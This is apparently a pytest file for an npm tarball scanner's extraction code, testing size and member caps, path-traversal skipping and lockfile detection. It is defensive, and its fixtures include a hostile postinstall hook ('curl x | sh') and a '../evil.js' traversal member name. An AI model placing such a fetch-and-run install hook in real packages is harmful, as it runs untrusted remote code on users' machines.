"""Extraction caps and path safety in fetcher.extract_tgz.

Archives are attacker-controlled. Extraction is in-memory, streaming, and
bounded; oversize/zip-bomb/too-many-member/traversal inputs must be refused or
skipped, never extracted to disk.
"""
import dataclasses
import hashlib
import io
import tarfile

import pytest

from npmdiffwatch import fetcher
from npmdiffwatch.config import Config


def _tgz(members):
    """members: list of (name, bytes). Produces a gzipped tar."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in members:
            ti = tarfile.TarInfo(name=name)
            ti.size = len(data)
            tar.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def _cfg(**over):
    return dataclasses.replace(Config(), **over)


def test_extracts_source_file_into_memory():
    blob = _tgz([("package/index.js", b"const x = 1;\n")])
    files, binaries, has_lock, has_shrink = fetcher.extract_tgz(blob, _cfg())
    assert files == {"index.js": b"const x = 1;\n"}
    assert has_lock is False and has_shrink is False


def test_too_many_members_refused():
    members = [(f"package/f{i}.js", b"x") for i in range(5)]
    with pytest.raises(fetcher.RefusedToExtract):
        fetcher.extract_tgz(_tgz(members), _cfg(max_members=2))


def test_an_oversized_file_is_skipped_and_the_rest_is_still_scanned():
    blob = _tgz([("package/package.json", b'{"scripts": {"postinstall": "node x.js"}}'),
                 ("package/bin/tool", b"B" * 100), ("package/x.js", b"run();\n")])
    files, binaries, *_ = fetcher.extract_tgz(blob, _cfg(max_member_bytes=50))
    assert files == {"package.json": b'{"scripts": {"postinstall": "node x.js"}}', "x.js": b"run();\n"}
    assert binaries == [{"path": "bin/tool", "size": 100, "reason": "file-too-large",
                         "sha256": hashlib.sha256(b"B" * 100).hexdigest()}]


def test_an_oversized_source_file_is_still_flagged_as_too_large_to_read():
    blob = _tgz([("package/bundle.js", b"x" * 100)])
    files, binaries, *_ = fetcher.extract_tgz(blob, _cfg(max_member_bytes=10, max_source_file_bytes=10))
    assert files == {}
    assert [(b["path"], b["reason"]) for b in binaries] == [("bundle.js", "source-too-large")]


def test_an_oversized_native_binary_still_counts_as_a_new_binary():
    blob = _tgz([("package/addon.node", b"N" * 100)])
    _, binaries, *_ = fetcher.extract_tgz(blob, _cfg(max_member_bytes=10))
    assert binaries == [{"path": "addon.node", "size": 100, "sha256": hashlib.sha256(b"N" * 100).hexdigest()}]


def test_the_archive_total_is_still_refused():
    blob = _tgz([("package/a.bin", b"x" * 60), ("package/b.bin", b"x" * 60)])
    with pytest.raises(fetcher.RefusedToExtract, match="total-size"):
        fetcher.extract_tgz(blob, _cfg(max_member_bytes=10, max_total_bytes=100))


def test_path_traversal_member_skipped_not_extracted():
    blob = _tgz([("package/../evil.js", b"bad"), ("package/ok.js", b"good")])
    files, *_ = fetcher.extract_tgz(blob, _cfg())
    assert "ok.js" in files
    assert all(".." not in p for p in files)
    assert not any(p.endswith("evil.js") for p in files)


def test_decompressed_size_cap_refused():
    blob = _tgz([("package/index.js", b"y" * 1000)])
    with pytest.raises(fetcher.RefusedToExtract):
        fetcher.extract_tgz(blob, _cfg(max_decompressed_bytes=50))


def test_lockfile_presence_detected():
    blob = _tgz([("package/package-lock.json", b"{}")])
    files, binaries, has_lock, has_shrink = fetcher.extract_tgz(blob, _cfg())
    assert has_lock is True


def test_package_json_and_lockfiles_at_the_package_root_are_extracted():
    blob = _tgz([("package/package.json", b'{"scripts": {"postinstall": "curl x | sh"}}'),
                 ("package/package-lock.json", b"{}"), ("package/npm-shrinkwrap.json", b"{}"),
                 ("package/lib/package.json", b"{}")])
    files, _, has_lock, has_shrink = fetcher.extract_tgz(blob, _cfg())
    assert set(files) == {"package.json", "package-lock.json", "npm-shrinkwrap.json"}
    assert has_lock and has_shrink
